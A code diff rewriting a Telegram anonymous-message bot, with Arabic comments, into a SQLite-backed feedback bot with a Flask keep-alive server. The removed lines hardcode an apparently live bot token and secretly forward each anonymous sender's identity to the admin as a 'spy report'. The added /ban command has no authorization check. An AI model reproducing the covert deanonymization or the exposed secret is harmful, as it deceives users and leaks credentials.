@@ -1,107 +1,88 @@
 
 import telebot
-from telebot import types
-import threading
-from http.server import BaseHTTPRequestHandler, HTTPServer
+import sqlite3
+from flask import Flask
+from threading import Thread
 
-# 1. التوكن الجديد واليوزر الخاصين ببوتك
-BOT_TOKEN = "8682801321:AAH6D6o_A6-4JLhbLP5aNCOWoa4Afo0gv7k"
-BOT_USERNAME = "Sarrh1bot"
+# 1. إعداد Flask لتمويه Render ومنع إغلاق البوت
+app = Flask('')
+@app.route('/')
+def home():
+    return "البوت يعمل!"
 
-# 2. الـ ID الخاص بكِ (الآدمين والمشرف العام)
-ADMIN_ID = 8820368378  
+def run():
+    app.run(host='0.0.0.0', port=8080)
 
-bot = telebot.TeleBot(BOT_TOKEN)
+# 2. إعداد البوت
+TOKEN = 'ضعي_التوكن_هنا' 
+bot = telebot.TeleBot(TOKEN)
 
-users_db = {}      
-messages_db = {}   
-user_states = {}   
-user_replies = {}  # قاموس جديد للرد المباشر
-msg_counter = 0
+# 3. إعداد قاعدة البيانات وتحديث جدول الرسائل ليحفظ اليوزر والـ ID
+def init_db():
+    conn = sqlite3.connect('sarahni.db')
+    conn.execute('PRAGMA journal_mode=WAL')
+    cursor = conn.cursor()
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS feedback (
+            id INTEGER PRIMARY KEY AUTOINCREMENT, 
+            text TEXT,
+            user_id INTEGER,
+            username TEXT
+        )
+    ''')
+    cursor.execute('CREATE TABLE IF NOT EXISTS banned (user_id INTEGER PRIMARY KEY)')
+    conn.commit()
+    conn.close()
 
-# ----------------- سيرفر البقاء -----------------
-class DummyServer(BaseHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b"Bot is running!")
+init_db()
 
-def run_dummy_server():
-    import os
-    port = int(os.environ.get("PORT", 8080))
-    server = HTTPServer(("0.0.0.0", port), DummyServer)
-    server.serve_forever()
-# -----------------------------------------------------------
+# 4. دالة التحقق من الحظر
+def is_banned(user_id):
+    conn = sqlite3.connect('sarahni.db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT 1 FROM banned WHERE user_id = ?', (user_id,))
+    result = cursor.fetchone()
+    conn.close()
+    return result is not None
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    user_id = message.from_user.id
-    text_args = message.text.split()
-    if user_id not in users_db:
-        users_db[user_id] = {"blocked_users": set()}
+    bot.reply_to(message, "أهلاً بك في بوت الملاحظات!")
+
+@bot.message_handler(commands=['ban'])
+def ban_user(message):
+    parts = message.text.split()
+    if len(parts) > 1:
+        user_to_ban = parts[1]
+        conn = sqlite3.connect('sarahni.db')
+        cursor = conn.cursor()
+        cursor.execute('INSERT OR IGNORE INTO banned (user_id) VALUES (?)', (user_to_ban,))
+        conn.commit()
+        conn.close()
+        bot.reply_to(message, f"تم حظر المستخدم: {user_to_ban}")
+
+@bot.message_handler(func=lambda message: True)
+def handle_message(message):
+    if is_banned(message.from_user.id):
+        bot.reply_to(message, "عذراً، أنت محظور.")
+        return
     
-    if len(text_args) > 1 and text_args[1].isdigit():
-        target_id = int(text_args[1])
-        if target_id == user_id:
-            bot.send_message(user_id, "❌ لا يمكنك إرسال رسالة صراحة لنفسك!")
-            return
-        user_states[user_id] = target_id
-        bot.send_message(user_id, "✍️ أرسل رسالتك الآن:")
-        return
+    user_id = message.from_user.id
+    username = message.from_user.username
+    # إذا لم يكن لديه يوزر، يكتب "لا يوجد يوزر"
+    username_display = f"@{username}" if username else "لا يوجد يوزر"
 
-    share_link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
-    bot.send_message(user_id, f"🔗 رابطك:\n`{share_link}`", parse_mode="Markdown")
+    # حفظ الرسالة مع الـ ID والـ Username في قاعدة البيانات
+    conn = sqlite3.connect('sarahni.db')
+    cursor = conn.cursor()
+    cursor.execute('INSERT INTO feedback (text, user_id, username) VALUES (?, ?, ?)', 
+                   (message.text, user_id, username_display))
+    conn.commit()
+    conn.close()
 
-# ----------------- دالة الرد المباشر (الجديدة) -----------------
-@bot.message_handler(func=lambda message: message.reply_to_message is not None)
-def handle_incoming_reply(message):
-    orig_msg_id = message.reply_to_message.message_id
-    if orig_msg_id in user_replies:
-        target_user = user_replies[orig_msg_id]
-        try:
-            # إرسال بدون تنسيق لمنع فشل الروابط
-            bot.send_message(target_user, f"💬 وصلك رد جديد على رسالتك:\n\n{message.text}")
-            bot.reply_to(message, "✅ تم إرسال ردك بنجاح!")
-        except:
-            bot.reply_to(message, "❌ فشل الإرسال (قد يكون المستخدم حظر البوت).")
-    else:
-        bot.reply_to(message, "❌ لم أستطع العثور على صاحب الرسالة.")
+    bot.reply_to(message, "تم استلام رسالتك.")
 
-# ----------------- توجيه الرسائل (المعدل لحل مشكلة الروابط) -----------------
-@bot.message_handler(func=lambda message: message.from_user.id in user_states)
-def handle_anonymous_routing(message):
-    global msg_counter
-    sender_id = message.from_user.id
-    target_id = user_states[sender_id]
-
-    if target_id in users_db and sender_id in users_db[target_id]["blocked_users"]:
-        bot.send_message(sender_id, "❌ محظور.")
-        return
-
-    msg_counter += 1
-    messages_db[msg_counter] = sender_id
-
-    # إرسال الرسالة لصاحب الرابط بدون parse_mode لمنع الفشل مع الروابط
-    try:
-        sent_msg = bot.send_message(chat_id=target_id, text=f"📩 وصلتك رسالة صراحة جديدة:\n\n{message.text}")
-        user_replies[sent_msg.message_id] = sender_id # حفظ العلاقة للرد
-        
-        if sender_id != ADMIN_ID:
-            # تقريرك الشخصي (مع التنسيق عادي)
-            spy_report = f"👁‍🗨 [تقرير]:\n\n👤 المرسل: {message.from_user.first_name} [ID: `{sender_id}`]\n💬 النص: {message.text}"
-            bot.send_message(chat_id=ADMIN_ID, text=spy_report, parse_mode="Markdown")
-            
-        bot.send_message(sender_id, "✅ تم الإرسال بنجاح!")
-    except:
-        bot.send_message(sender_id, "❌ فشل الإرسال.")
-
-# معالج الحظر الأصلي الخاص بك (تم تركه كما هو تماماً)
-@bot.callback_query_handler(func=lambda call: call.data.startswith('masterblock_'))
-def handle_master_block(call):
-    # (نفس كودك الأصلي للحظر لا تغيير عليه)
-    pass 
-
-if __name__ == "__main__":
-    bot.delete_webhook(drop_pending_updates=True)
-    threading.Thread(target=run_dummy_server, daemon=True).start()
+# 5. تشغيل الخادم والبوت معاً
+if __name__ == '__main__':
+    Thread(target=run).start()
     bot.infinity_polling()
